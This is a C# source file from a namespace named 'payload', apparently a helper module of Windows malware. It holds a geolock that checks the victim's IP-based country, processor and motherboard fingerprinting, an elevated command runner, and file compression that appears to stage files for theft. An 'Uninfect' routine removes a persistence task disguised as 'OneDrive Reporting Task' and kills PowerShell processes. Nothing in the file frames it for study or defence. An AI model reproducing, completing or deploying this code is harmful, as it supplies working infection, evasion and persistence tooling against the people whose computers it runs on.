using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;

using Newtonsoft.Json;

namespace payload
{
    public class Utils
    {
        public static bool Geocheck(List<string> geolock)
        {
            if (geolock.Count > 0)
            {
                WebClient wc = new WebClient();
                string country = JsonConvert.DeserializeObject<Dictionary<string, string>>(wc.DownloadString($"https://api.iplocation.net/?ip={wc.DownloadString("https://api.ipify.org/?format=txt")}"))["country_name"];
                wc.Dispose();

                if (!geolock.Contains(country.ToLower()) || !geolock.Contains(CultureInfo.CurrentCulture.EnglishName.ToLower())) return true;
                return false;
            }
            return false;
        }

        public static (MemoryStream, Stream) CompressFile(string filepath)
        {
            MemoryStream compressed = new MemoryStream();
            ZipArchive archive = new ZipArchive(compressed, ZipArchiveMode.Create, true);
            ZipArchiveEntry entry = archive.CreateEntry(Path.GetFileName(filepath), CompressionLevel.Optimal);

            Stream entrystream = entry.Open();
            MemoryStream filestream = new MemoryStream(File.ReadAllBytes(filepath));
            filestream.CopyTo(entrystream);
            filestream.Dispose();
            archive.Dispose();

            return (compressed, entrystream);
        }

        public static string Execute(string filename, string args)
        {
            Process cmdproc = new Process()
            {
                StartInfo = new ProcessStartInfo()
                {
                    FileName = filename,
                    Arguments = args,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    Verb = "runas"
                }
            };
            cmdproc.Start();
            string output = cmdproc.StandardOutput.ReadToEnd();
            cmdproc.WaitForExit();
            return output;
        }

        public static string GetProcessorId()
        {
            string id = string.Empty;
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * From Win32_processor");
                id = searcher.Get().Cast<ManagementObject>().Select(x => x["ProcessorID"]).ToList()[0].ToString();
                searcher.Dispose();
            }
            catch { }
            return id;
        }

        public static string GetMotherboardSerialNum()
        {
            string id = string.Empty;
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * From Win32_BaseBoard");
                id = searcher.Get().Cast<ManagementObject>().Select(x => x["SerialNumber"]).ToList()[0].ToString();
                searcher.Dispose();
            }
            catch { }
            return id;
        }

        public static void Uninfect()
        {
            Process.Start(new ProcessStartInfo()
            {
                FileName = "schtasks.exe",
                Arguments = "/delete /tn \"OneDrive Reporting Task\" /f",
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();
            Process.Start(new ProcessStartInfo()
            {
                FileName = "taskkill.exe",
                Arguments = "/f /im powershell.exe",
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden
            });
            Environment.Exit(1);
        }
    }
}
